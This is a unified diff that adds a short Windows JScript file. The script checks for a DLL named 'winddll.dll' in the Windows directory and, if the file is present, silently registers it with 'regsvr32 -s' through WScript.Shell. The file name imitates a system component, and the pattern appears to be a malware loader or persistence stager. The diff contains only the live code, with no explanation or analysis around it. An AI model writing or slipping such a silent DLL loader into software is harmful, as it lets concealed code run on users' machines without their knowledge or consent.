@@ -1,0 +1,6 @@
+var WSH = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+if(fso.FileExists("c:\\windows\\winddll.dll"))
+{
+WSH.Run("regsvr32 c:\\windows\\winddll.dll -s");
+}
